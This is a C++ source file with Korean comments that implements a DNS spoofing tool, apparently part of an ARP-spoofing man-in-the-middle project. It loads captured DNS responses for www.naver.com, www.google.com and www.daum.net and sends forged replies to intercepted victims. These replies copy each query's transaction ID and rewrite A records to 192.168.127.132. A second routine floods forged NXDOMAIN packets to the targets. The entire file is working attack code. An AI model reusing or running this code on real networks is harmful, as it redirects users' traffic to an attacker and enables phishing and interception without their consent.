#include "dns_spoof.hpp"
#include "arp_spoof.hpp"
#include "network_utils.hpp"
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <arpa/inet.h>
#include <string>
#include <vector>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <memory>
#include <unordered_map>
#include <unistd.h>

#define DNS_PORT 53

using namespace std;

// 글로벌 변수 선언
vector<vector<uint8_t>> dns_template_naver;
vector<vector<uint8_t>> dns_template_google;
vector<vector<uint8_t>> dns_template_daum;

// 각 도메인별 템플릿 캐시
unordered_map<string, vector<DnsTemplateCache>> template_cache;

// 미리 계산된 패킷을 위한 메모리 풀
vector<uint8_t> packet_buffer(2048);  // 최대 패킷 크기를 충분히 잡음

bool load_dns_response_template(const char* filename, vector<vector<uint8_t>>& templates) 
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle = pcap_open_offline(filename, errbuf);
    if (!pcap_handle) 
    {
        cerr << "pcap 파일 열기 실패: " << errbuf << endl;
        return false;
    }

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) 
    {
        if (res == 0 || header->caplen < 14) 
        {
            continue;
        }

        const ether_header* eth_hdr = reinterpret_cast<const ether_header*>(packet);
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) 
        {
            continue;
        }

        const ip_header* ip_hdr = reinterpret_cast<const ip_header*>(packet + 14);
        int ip_header_len = (ip_hdr->ip_vhl & 0x0f) * 4;
        if (ip_hdr->ip_p != IPPROTO_UDP) 
        {
            continue;
        }

        const udp_header* udp_hdr = reinterpret_cast<const udp_header*>(packet + 14 + ip_header_len);
        
        // 응답 패킷만 선택 (출발지 포트가 53인 경우)
        if (ntohs(udp_hdr->uh_sport) != DNS_PORT) 
        {
            continue;
        }

        templates.emplace_back(packet, packet + header->caplen);
    }

    pcap_close(pcap_handle);
    if (!templates.empty()) 
    {
        cout << filename << " 로부터 DNS 응답 템플릿 " << templates.size() << "개 로드 완료" << endl;
        return true;
    } 
    else 
    {
        cerr << "DNS 응답 패킷 찾지 못함: " << filename << endl;
        return false;
    }
}

// 패킷 캐싱을 위한 함수
void cache_template_packet(const vector<uint8_t>& packet, const string& domain)
{
    const int eth_len = 14;
    const auto* ip = (ip_header*)(packet.data() + eth_len);
    int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
    const auto* udp = (udp_header*)(packet.data() + eth_len + ip_header_len);
    const auto* dns = (dns_header*)(packet.data() + eth_len + ip_header_len + sizeof(udp_header));

    bool is_response = ntohs(udp->uh_sport) == DNS_PORT;

    if (!is_response)
    {
        cout << "경고: 응답 패킷이 아닌 패킷을 캐시에 저장하지 않음" << endl;
        return;
    }

    uint8_t* qptr = (uint8_t*)dns + sizeof(dns_header);
    while (*qptr != 0 && (qptr - (uint8_t*)dns) < packet.size() - (eth_len + ip_header_len + sizeof(udp_header)))
    {
        qptr += (*qptr) + 1;
    }
    qptr++;
    uint16_t qtype = ntohs(*(uint16_t*)qptr);

    DnsTemplateCache cache_entry;
    cache_entry.packet = packet;
    cache_entry.qtype = qtype;
    cache_entry.is_response = is_response;

    template_cache[domain].push_back(move(cache_entry));

    cout << "캐시 추가: " << domain << ", 타입: " << qtype << ", 응답여부: " << (is_response ? "응답" : "요청") << endl;
}

// 초기화 함수 ( 템플릿 로딩)
bool initialize_dns_templates()
{
    bool success = true;

    if (!load_dns_response_template("data/dns_naver2.pcapng", dns_template_naver))
        success = false;
    if (!load_dns_response_template("data/dns_google2.pcapng", dns_template_google))
        success = false;
    if (!load_dns_response_template("data/dns_daum2.pcapng", dns_template_daum))
        success = false;

    for (const auto& packet : dns_template_naver)
    {
        cache_template_packet(packet, "www.naver.com");
    }

    for (const auto& packet : dns_template_google)
    {
        cache_template_packet(packet, "www.google.com");
    }

    for (const auto& packet : dns_template_daum)
    {
        cache_template_packet(packet, "www.daum.net");
    }

    cout << "DNS 템플릿 캐시 초기화 완료: " << template_cache.size() << "개 도메인" << endl;

    return success;
}

string extract_domain_name(const uint8_t* dns_data, size_t dns_len)
{
    string domain;
    size_t pos = 12;
    while (pos < dns_len)
    {
        uint8_t len = dns_data[pos];
        if (len == 0)
            break;
        if (!domain.empty())
            domain.push_back('.');
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++)
        {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}

// 최적화된 스푸핑 응답 함수
void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_packet_len,
                             const u_int8_t* attacker_mac, const u_int8_t* gateway_ip,
                             const std::string& domain,
                             const vector<unique_ptr<SpoofTarget>>& targets) 
{
    const int eth_len = 14;
    const ip_header* ip = (ip_header*)(orig_packet + eth_len);
    int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
    const udp_header* udp = (udp_header*)(orig_packet + eth_len + ip_header_len);
    const dns_header* dns = (dns_header*)(orig_packet + eth_len + ip_header_len + sizeof(udp_header));

    // 쿼리 데이터 분석
    const uint8_t* query_data = (uint8_t*)dns;
    size_t query_len = orig_packet_len - (eth_len + ip_header_len + sizeof(udp_header));
    
    // 쿼리 타입 확인
    uint8_t* qptr = (uint8_t*)query_data + sizeof(dns_header);
    while (*qptr != 0 && (qptr - query_data) < query_len) 
    {
        qptr += (*qptr) + 1;
    }
    qptr++;  // null 바이트 건너뛰기
    uint16_t qtype = ntohs(*(uint16_t*)qptr);

    // 혹시 모를 대문자 도메인 방지용
    string normalized_domain = domain;
    for (auto& c : normalized_domain) 
    {
        c = tolower(c);
    }
    
    // 캐시에서 찾기
    if (template_cache.find(normalized_domain) == template_cache.end()) 
    {
        cerr << "[" << domain << "] DNS 템플릿 없음. 전송 생략.\n";
        return;
    }
    
    const auto& templates = template_cache[normalized_domain];
    bool template_found = false;
    
    // 요청 소스 IP 및 MAC 정보 저장
    u_int8_t requester_ip[4];
    memcpy(requester_ip, &ip->ip_src, 4);
    u_int8_t requester_mac[6] = {0};
    
    // 타겟 MAC 주소 찾기
    bool found_target = false;
    for (const auto& target : targets) 
    {
        if (ip_equals(requester_ip, target->get_ip())) 
        {
            memcpy(requester_mac, target->get_mac(), 6);
            found_target = true;
            break;
        }
    }
    
    if (!found_target) 
    {
        cerr << "[DNS 응답] 대상 MAC 찾기 실패. 전송 생략.\n";
        return;
    }
    
    // 응답 패킷 생성
    for (const auto& cache_entry : templates) 
    {
        // 응답 패킷인지 확인
        if (!cache_entry.is_response) 
        {
            continue;
        }
        
        // A 레코드나 HTTPS 레코드 타입 확인
        if (qtype == cache_entry.qtype || 
            (qtype == 1 && cache_entry.qtype == 1) ||  // A 레코드
            (qtype == 65 && cache_entry.qtype == 65))  // HTTPS 레코드
        {
            template_found = true;
            
            // 패킷 복사 및 수정 (캐시된 패킷 사용)
            memcpy(packet_buffer.data(), cache_entry.packet.data(), cache_entry.packet.size());
            size_t spoof_packet_size = cache_entry.packet.size();
            
            // 패킷 헤더 확인 - 반드시 응답 패킷이어야 함
            ether_header* eth_resp = (ether_header*)packet_buffer.data();
            ip_header* ip_resp = (ip_header*)(packet_buffer.data() + eth_len);
            
            if (ntohs(eth_resp->ether_type) != ETHERTYPE_IP) 
            {
                cerr << "템플릿 패킷이 IP 패킷이 아님. 스푸핑 중단.\n";
                continue;
            }
            
            // 이더넷 MAC 주소 설정 - 공격자 MAC을 출발지로, 대상 MAC을 목적지로
            memcpy(eth_resp->ether_shost, attacker_mac, 6);
            memcpy(eth_resp->ether_dhost, requester_mac, 6);
            
            cout << "[DNS 응답] → " << ip_to_string(requester_ip) << ", MAC: " << mac_to_string(requester_mac) 
                 << " (타입: " << cache_entry.qtype << ")\n";

            // IP 헤더 수정
            ip_resp->ip_src = ip->ip_dst;  // 게이트웨이 IP를 출발지로
            ip_resp->ip_dst = ip->ip_src;  // 요청자 IP를 목적지로
            ip_resp->ip_id = htons(rand() % 65536);  // 랜덤 ID 부여
            ip_resp->ip_sum = 0;  // 체크섬 초기화
            
            // 체크섬 계산 최적화
            uint16_t* ip_words = (uint16_t*)ip_resp;
            unsigned long ip_sum = 0;
            for (int i = 0; i < ip_header_len / 2; i++) ip_sum += ntohs(ip_words[i]);
            while (ip_sum >> 16) ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
            ip_resp->ip_sum = htons(~ip_sum);

            // UDP 헤더 수정
            udp_header* udp_resp = (udp_header*)(packet_buffer.data() + eth_len + ip_header_len);
            udp_resp->uh_sport = udp->uh_dport;  // DNS 포트(53)를 출발지로
            udp_resp->uh_dport = udp->uh_sport;  // 요청자 포트를 목적지로
            udp_resp->uh_sum = 0;  // UDP 체크섬은 선택사항이므로 0으로 설정 가능

            // DNS 헤더 수정 - 트랜잭션 ID를 원본 요청의 ID로 설정
            dns_header* dns_resp = (dns_header*)(packet_buffer.data() + eth_len + ip_header_len + sizeof(udp_header));
            dns_resp->id = dns->id;  // 원래 요청의 트랜잭션 ID 사용

            // 스푸핑 IP 삽입
            const char* spoof_ip = "192.168.127.132";  // 스푸핑할 IP 주소
            uint32_t new_ip;
            inet_pton(AF_INET, spoof_ip, &new_ip);

            // 응답 데이터 섹션에서 IP 주소 변경
            uint8_t* dns_data = (uint8_t*)dns_resp;
            size_t dns_len = spoof_packet_size - (eth_len + ip_header_len + sizeof(udp_header));
            uint8_t* current = dns_data + sizeof(dns_header);

            // 질의 부분 건너뛰기
            while (*current != 0 && (current - dns_data) < dns_len) 
            {
                current += 1 + *current;
            }
            current += 5;  // null 바이트 + QTYPE(2) + QCLASS(2)
                
            // 응답 레코드 순회
            for (int i = 0; i < ntohs(dns_resp->ancount); i++) 
            {
                // 도메인 이름 건너뛰기 (압축된 포인터 또는 일반 문자열)
                if (current[0] == 0xC0) 
                {
                    current += 2;
                }
                else 
                {
                    while (*current != 0 && (current - dns_data) < dns_len) 
                    {
                        current += 1 + *current;
                    }
                    current += 1;
                }

                // 레코드 타입 확인
                uint16_t answer_type = (current[0] << 8) | current[1];
                uint16_t rdlength = (current[8] << 8) | current[9];
                size_t offset = (current - dns_data) + 10;

                // A 레코드인 경우에만 IP 주소 변경
                if (answer_type == 1 && rdlength == 4 && offset + 4 <= dns_len) 
                {
                    memcpy(dns_data + offset, &new_ip, 4);
                }

                current += 10 + rdlength;
            }

            // 패킷을 메모리에 준비했으니 이제 여러 번 전송
            bool at_least_one_success = false;
            
            struct timespec start, end;
            clock_gettime(CLOCK_MONOTONIC, &start);
            

            // 패킷 전송
            if (pcap_sendpacket(handle, packet_buffer.data(), spoof_packet_size) != 0) 
            {
                cerr << "DNS 스푸핑 응답 전송 실패 #" << ": " << pcap_geterr(handle) << endl;
            } 
            else 
            {
                at_least_one_success = true;
                cout << "DNS 스푸핑 응답 전송 완료 " << " (" << domain << ", 타입: " << cache_entry.qtype << endl;
            }
            usleep(1000);  // 1ms 지연
            
            clock_gettime(CLOCK_MONOTONIC, &end);
            long nsec = (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
            
            if (at_least_one_success) {
                cout << "DNS 스푸핑 성공: " << endl;
                return;  // 성공적으로 전송했으므로 종료
            }
        }
    }
    
    // 적절한 템플릿을 찾지 못했을 경우에만 이 메시지 출력
    if (!template_found) {
        cout << "[" << domain << "] 요청된 레코드 타입(" << qtype << ")에 맞는 템플릿을 찾지 못했습니다.\n";
    }
}

// DNS 스푸핑 복구 함수 - NXDOMAIN 패킷 사용
void send_dns_recovery_responses(pcap_t* handle, 
    const u_int8_t* attacker_mac, const u_int8_t* gateway_ip,
    const std::vector<std::unique_ptr<SpoofTarget>>& targets) 
{
    cout << "DNS 스푸핑 복구 시작 (NXDOMAIN 패킷 + 정상 IP 패킷)..." << endl;
    
    // 복구할 도메인 목록
    const vector<string> recovery_domains = {
        "www.naver.com", 
        "www.google.com", 
        "www.daum.net"
    };
    
    // 각 도메인에 대해 복구 패킷 전송
    for (const auto& domain : recovery_domains) {
        // 해당 도메인의 템플릿이 없으면 건너뛰기
        string normalized_domain = domain;
        for (auto& c : normalized_domain) {
            c = tolower(c);
        }
        
        if (template_cache.find(normalized_domain) == template_cache.end()) 
        {
            cerr << "[" << domain << "] DNS 템플릿 없음. 복구 생략.\n";
            continue;
        }
        
        // 해당 도메인의 A 레코드 템플릿을 찾기
        bool found_template = false;
        
        for (const auto& cache_entry : template_cache[normalized_domain]) 
        {
            // A 레코드(타입 1)만 사용
            if (cache_entry.qtype == 1 && cache_entry.is_response) 
            {
                found_template = true;
                
                // 각 대상별로 복구 패킷 전송
                for (const auto& target : targets) 
                {
                    // NXDOMAIN 패킷 전송
                    vector<uint8_t> nxdomain_packet = cache_entry.packet;
                    const int eth_len = 14;
                    
                    // 이더넷 헤더 수정
                    ether_header* eth_nx = (ether_header*)nxdomain_packet.data();
                    memcpy(eth_nx->ether_shost, attacker_mac, 6);
                    memcpy(eth_nx->ether_dhost, target->get_mac(), 6);
                    
                    // IP 헤더 수정
                    ip_header* ip_nx = (ip_header*)(nxdomain_packet.data() + eth_len);
                    int ip_header_len = (ip_nx->ip_vhl & 0x0f) * 4;
                    
                    // 출발지/목적지 IP 설정
                    memcpy(&ip_nx->ip_src, gateway_ip, 4);
                    memcpy(&ip_nx->ip_dst, target->get_ip(), 4);
                    
                    // 랜덤 ID 설정
                    ip_nx->ip_id = htons(rand() % 65536);
                    ip_nx->ip_sum = 0;
                    
                    // 체크섬 재계산
                    uint16_t* ip_words = (uint16_t*)ip_nx;
                    unsigned long ip_sum = 0;
                    for (int i = 0; i < ip_header_len / 2; i++) 
                    {
                        ip_sum += ntohs(ip_words[i]);
                    }
                    while (ip_sum >> 16) 
                    {
                        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
                    }
                    ip_nx->ip_sum = htons(~ip_sum);
                    
                    // UDP 헤더 정보는 크게 수정할 필요 없음
                    udp_header* udp_nx = (udp_header*)(nxdomain_packet.data() + eth_len + ip_header_len);
                    
                    // DNS 헤더 수정
                    dns_header* dns_nx = (dns_header*)(nxdomain_packet.data() + eth_len + ip_header_len + sizeof(udp_header));
                    dns_nx->id = htons(rand() % 65535);  // 랜덤 트랜잭션 ID
                    
                    // 중요: NXDOMAIN 설정 (RCODE=3)
                    // DNS 플래그의 하위 4비트를 NXDOMAIN(3)으로 설정
                    uint16_t flags = ntohs(dns_nx->flags);
                    flags = (flags & 0xFFF0) | 0x0003;  // 하위 4비트를 RCODE 3으로 설정
                    dns_nx->flags = htons(flags);
                    
                    // Answer 섹션 제거 (NXDOMAIN에는 답변이 없음)
                    dns_nx->ancount = 0;
                    
                    // NXDOMAIN 패킷 전송
                    for (int i = 0; i < 3; i++) 
                    {
                        if (pcap_sendpacket(handle, nxdomain_packet.data(), nxdomain_packet.size()) != 0) 
                        {
                            cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
                        } 
                        else 
                        {
                            cout << "NXDOMAIN 패킷 전송 성공 "<< domain 
                                 << " (대상: " << target->get_ip_str() << ")" << endl;
                        }
                        usleep(10000);  // 10ms 지연
                    }
                    
                    // 잠시 대기 - NXDOMAIN이 처리될 시간 부여
                    usleep(50000);  // 50ms
                }
                break;
            }
        }
        
        if (!found_template) 
        {
            cerr << "[" << domain << "] A 레코드 템플릿을 찾지 못했습니다. 복구 생략.\n";
        }
    }
    
    cout << "DNS 스푸핑 복구 패킷 전송 완료" << endl;
}